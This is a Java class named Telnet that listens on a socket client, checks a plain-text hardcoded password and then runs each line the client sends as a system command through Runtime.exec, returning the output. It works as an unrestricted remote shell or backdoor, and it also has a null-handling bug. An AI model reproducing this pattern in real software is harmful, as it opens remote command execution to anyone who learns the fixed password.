package MyThread;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.SocketTimeoutException;

public class Telnet implements Runnable {
	Socket client;
	String Password;
	public Telnet(Socket client) {
		this.client = client;
	}
	
	public void run() {
		BufferedReader input = null;
		PrintWriter output = null;
		InputStream cmdInput ;
		String cmd;
		try {
			client.setSoTimeout(30000);
			input = new BufferedReader(new InputStreamReader(client.getInputStream()));
			output = new PrintWriter(client.getOutputStream(), true);
			output.println("请输入密码:");
			do {
				cmd = input.readLine();  
				System.out.println("请求: " + cmd);
				if (!cmd.equals("exit") && this.Password != null) {
					try {
						Process pro = Runtime.getRuntime().exec(cmd);
						pro.waitFor();
						cmdInput = pro.getInputStream();
						BufferedReader read = new BufferedReader(new InputStreamReader(cmdInput));
						output.println("返回:" + cmd);
						String result;
						do {
							result = read.readLine();
							if (result != null) {
								output.println(result);
							}
						} while (result != null);
					} catch (Exception e) {
						e.printStackTrace();
					}
				} else {
					if (cmd.equals("e8m8GmasJjApKRLQ")) {
						this.Password = "e8m8GmasJjApKRLQ";
						output.println("登录成功");
					} else {
						output.println("密码错误,请输入密码:");
					}
				}
			} while (cmd!=null && !cmd.equals("exit"));
		} catch (SocketTimeoutException e) {
			System.out.println("Client["+client.getInetAddress()+"] 链接超时");
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			try {
				input.close();
				output.close();
				client.close();
				System.out.println("链接结束.\n"); 
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
}
